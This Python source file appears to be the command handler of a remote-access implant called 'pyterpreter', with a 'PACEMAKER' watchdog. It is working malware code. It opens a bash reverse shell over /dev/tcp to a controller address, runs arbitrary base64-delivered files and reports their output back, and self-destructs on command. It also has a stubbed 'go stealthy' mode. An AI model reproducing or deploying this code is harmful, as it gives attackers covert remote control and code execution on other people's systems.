from base64 import b64decode, b64encode
import os
import signal
import subprocess
import tempfile
from threading import Thread
from typing import Callable

from core.command import CommandResponse, CommandResponseError, CommandTypes
from core.message import Message, MessageTypes
from core.event import Event, EventTypes

from pyterpreter import config
from pyterpreter.my_logging import Logger


logger = Logger('PACEMAKER')


def process_commands_forever(blocking=False):
    if blocking:
        while True:
            message: Message
            command_request = config.commands_to_process.get()
            try:
                returns = _process_command(command_request.uid, command_request.command_type, command_request.params)
            except Exception as ex:
                exception_str = "{}: {}".format(ex.__class__.__name__, str(ex))
                logger.log(f'Error occurred: {exception_str}')
                message = Message(MessageTypes.COMMAND_RESPONSE_ERROR, CommandResponseError(command_request.uid, exception_str).to_json())
            else:
                message = Message(MessageTypes.COMMAND_RESPONSE, CommandResponse(command_request.uid, returns).to_json())

            config.messages_to_send.put(message)
    else:
        Thread(target=process_commands_forever, args=(True,), daemon=True).start()


def _process_command(command_uid: str, command_type: str, params: dict) -> dict:
    logger.log(f'Received {command_type} command')

    if command_type == CommandTypes.PING:
        return {}

    elif command_type == CommandTypes.OPEN_SHELL:
        port = params["port"]
        _start_process_detached(f"/bin/bash -c 'bash -i >& /dev/tcp/{config.LOCAL_IP}/{port} 0>&1'")
        return {}

    elif command_type == CommandTypes.GO_STEALTHY:
        raise NotImplementedError()

    elif command_type == CommandTypes.SELF_DESTRUCT:
        config.self_destructing = True
        os.kill(config.pacemaker_pid, signal.SIGKILL)
        logger.log('Exiting')
        os.kill(os.getpid(), signal.SIGTERM)

    elif command_type == CommandTypes.RUN_FILE:
        contents_b64 = params["contents_b64"]
        path = _create_tmp_file(b64decode(contents_b64))
        os.system(f'chmod +x {path}')
        def on_exit(exit_code: int, output: bytes):
            logger.log(f'File exited with code: {exit_code}')
            config.messages_to_send.put(Message(MessageTypes.EVENT, Event(EventTypes.RUN_FILE_FINISH, {
                'command_uid': command_uid,
                'exit_code': exit_code,
                'output_b64': b64encode(output).decode(),
            }).to_json()))
        _start_process_in_new_thread(path, on_exit)
        return {}

    else:
        raise Exception("Command '{}' not implemented".format(command_type))


def _start_process_detached(command: str):
    print(f'Running detached: "{command}"')
    proc = subprocess.Popen('/bin/sh', stdin=subprocess.PIPE)
    proc.stdin.write(f'{command} &\nexit\n'.encode())
    proc.communicate()


def _start_process_in_new_thread(command: str, callback: Callable[[int, bytes], None]):
    def do_work():
        proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        callback(proc.returncode, proc.stdout)
    Thread(target=do_work, daemon=True).start()


def _create_tmp_file(contents: bytes) -> str:
    with tempfile.NamedTemporaryFile('wb', delete=False) as fh:
        fh.write(contents)
        return fh.name
